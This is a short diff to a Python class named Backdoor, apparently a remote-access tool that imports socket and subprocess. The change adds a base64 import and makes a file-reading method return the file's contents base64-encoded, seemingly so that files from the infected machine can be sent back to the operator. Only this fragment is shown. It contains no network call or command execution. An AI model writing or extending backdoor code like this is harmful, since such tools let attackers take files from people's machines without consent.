@@ -33,6 +33,7 @@ import os
 import socket
 import subprocess
 import json
+import base64
 
 
 class Backdoor:
@@ -100,7 +101,8 @@ class Backdoor:
         :type path: str
         """
         with open(path, "rb") as file:
-            return file.read()
+            # convert unknown characters to known characters
+            return base64.b64encode(file.read())
 
     def run(self):
         """
